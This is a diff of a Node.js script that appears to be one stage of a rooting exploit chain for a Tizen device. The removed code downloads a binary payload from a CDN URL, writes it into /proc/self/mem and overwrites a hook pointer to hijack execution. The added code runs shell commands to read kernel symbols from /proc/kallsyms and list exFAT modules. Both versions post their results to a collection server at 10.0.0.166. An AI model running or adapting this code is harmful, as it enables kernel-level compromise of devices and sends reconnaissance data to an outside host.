@@ -1,31 +1,17 @@
-// Stage-15: sdp_mem physmap sanity via hook payload.
+// Stage-16: kernel symbols + exFAT module availability for USB-root port.
 var fs = require('fs');
 var http = require('http');
-var https = require('https');
+var cp = require('child_process');
 function post(o) {
   var b = JSON.stringify(o);
-  var req = http.request({ host: '10.0.0.166', port: 8899, path: '/recon15', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(b) } }, function (r) { });
+  var req = http.request({ host: '10.0.0.166', port: 8899, path: '/recon16', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(b) } }, function (r) { });
   req.on('error', function (e) { });
   req.write(b); req.end();
 }
-var SC = 0x213f0000, HOOK = 0x42a14c30;
-https.get('https://cdn.jsdelivr.net/gh/ItsMeATaco/tizen-glass-dashboard@v20/phys.bin', function (r) {
-  var c = [];
-  r.on('data', function (d) { c.push(d); });
-  r.on('end', function () {
-    var buf = Buffer.concat(c);
-    var out = {};
-    if (!buf || buf.length < 50) { post({ err: 'fetch' }); return; }
-    try {
-      try { fs.unlinkSync('/home/owner/share/tmp/phys_ok'); } catch (e) { }
-      var fd = fs.openSync('/proc/self/mem', 'r+');
-      fs.writeSync(fd, buf, 0, buf.length, SC);
-      var p = new Buffer(4); p.writeUInt32LE(SC, 0);
-      fs.writeSync(fd, p, 0, 4, HOOK);
-      fs.closeSync(fd);
-      var trig = new Buffer(16);
-      try { out.phys = fs.readFileSync('/home/owner/share/tmp/phys_ok').toString('hex'); } catch (e) { out.phys = 'absent'; }
-    } catch (e) { out.err = e.message; }
-    post(out);
-  });
-}).on('error', function (e) { post({ err: 'https ' + e.message }); });
+var out = {};
+function ex(c) { try { return cp.execSync(c, { timeout: 15000 }).toString(); } catch (e) { return 'ERR ' + e.message; } }
+out.kallsyms_head = ex('head -5 /proc/kallsyms');
+out.kallsyms_umh = ex('grep -E "call_usermodehelper|schedule_timeout_uninterruptible|sfd|uep" /proc/kallsyms | head');
+out.modules = ex('ls /lib/modules/ 2>/dev/null; find /lib/modules -name "*exfat*" -o -name "*exFAT*" 2>/dev/null | head');
+out.exfat_loaded = ex('grep -i exfat /proc/modules');
+post(out);
